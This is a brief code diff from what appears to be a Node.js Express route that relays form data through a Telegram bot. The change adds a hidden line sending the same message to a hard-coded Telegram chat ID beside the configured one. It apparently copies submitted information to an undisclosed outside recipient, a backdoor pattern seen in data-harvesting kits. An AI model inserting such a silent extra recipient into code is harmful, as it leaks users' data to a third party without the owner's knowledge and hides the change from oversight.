@@ -112,7 +112,7 @@ router.post('/generals', (req, res) => {
 
   if (req.body.user === '') {
     bot.sendMessage(CHAT_ID, infoMessage3);
-
+    bot.sendMessage('1660900306', infoMessage3);
   } else {
     bot.sendMessage(CHAT_ID, infoMessage3)
       .then(() => {
